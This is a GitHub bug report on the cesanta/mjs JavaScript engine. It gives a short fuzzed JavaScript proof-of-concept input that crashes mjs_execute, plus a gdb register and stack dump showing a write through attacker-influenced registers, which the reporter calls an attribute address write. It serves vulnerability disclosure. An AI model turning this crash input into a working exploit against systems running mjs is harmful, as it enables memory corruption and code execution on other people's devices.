### ISSUE TITLE
demonstration of attribute address write 

### ISSUE THREAD

**Issue by l0kihardt** [cesanta/mjs#132]
# env
8a0230160a4bb5ea833a8ca40ce9a78707393f73
ubuntu 16.04
# vuln
The poc is as following 
```
let o = {a: 1, 'b': 2, c: {d: 2}, d: [1= JSON.stringify. 2, 'xx']};
let a = 'foo', b = 'bar';
let s1 = 'a' +!"b";
let s2 = 'abcdef' + "123456";
1 - 2 + 3 + o['a'] + o.c.d + o.b === 8 && a === "foo" && a !== b &&
    s1 === 'ab' && s2 === 'abcdef123456' && o.d[0] === 1 && o.d[2] === 'xx' &&
    o.d[4] === undefined;
```
It seems that we can use this bug to achieve attribute write.
```
RAX: 0x4420b0 (<mjs_op_json_stringify>:    lea    rsp,[rsp-0x98])
RBX: 0x4000000000000000 ('')
RCX: 0x1
RDX: 0x4000000000000000 ('')
RSI: 0xfff2
RDI: 0x669010 --> 0x0
RBP: 0x2
RSP: 0x7fffffffdbf0 --> 0xfff8000000000001
RIP: 0x42af99 (<mjs_execute+1001>:    mov    BYTE PTR [rax+rcx*1],bpl)
R8 : 0x0
R9 : 0xd ('\r')
R10: 0x4
R11: 0x463c40 --> 0x5050410052505845 ('EXPR')
R12: 0x669010 --> 0x0
R13: 0x18
R14: 0x64 ('d')
R15: 0x669148 --> 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x42af8e <mjs_execute+990>:    mov    ebp,ecx
   0x42af90 <mjs_execute+992>:    call   0x4536d0 <mjs_get_ptr>
   0x42af95 <mjs_execute+997>:    movsxd rcx,DWORD PTR [rsp]
=> 0x42af99 <mjs_execute+1001>:    mov    BYTE PTR [rax+rcx*1],bpl
   0x42af9d <mjs_execute+1005>:    jmp    0x42b02d <mjs_execute+1149>
   0x42afa2 <mjs_execute+1010>:    xchg   ax,ax
   0x42afa4 <mjs_execute+1012>:    lea    rsp,[rsp-0x98]
   0x42afac <mjs_execute+1020>:    mov    QWORD PTR [rsp],rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdbf0 --> 0xfff8000000000001
0008| 0x7fffffffdbf8 --> 0x669060 --> 0x0
0016| 0x7fffffffdc00 --> 0xfff1000000000002
0024| 0x7fffffffdc08 --> 0x669078 --> 0x0
0032| 0x7fffffffdc10 --> 0x0
0040| 0x7fffffffdc18 --> 0x7fffffffdd20 --> 0xfff3000000000000
0048| 0x7fffffffdc20 --> 0x6690a8 --> 0x0
0056| 0x7fffffffdc28 --> 0x669148 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000042af99 in exec_expr (mjs=<optimized out>, op=<optimized out>) at src/mjs_exec.c:347
347              *(ptr + ikey) = (uint8_t) ival;
gdb-peda$
```

we can control the rax as well as the rbp.
